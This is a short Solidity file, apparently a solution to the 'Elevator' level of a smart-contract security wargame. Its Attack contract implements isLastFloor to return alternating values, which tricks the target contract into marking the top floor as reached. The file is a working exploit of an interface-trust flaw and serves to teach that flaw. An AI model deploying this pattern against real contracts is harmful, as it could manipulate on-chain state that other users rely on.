// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../instances/Ilevel11.sol";

contract Attack {
    Elevator elevator;
    bool isTopFloor = false;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function attack() public {
        elevator.goTo(10);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        bool swtich = isTopFloor;
        isTopFloor = !isTopFloor;
        return swtich;
    }
}
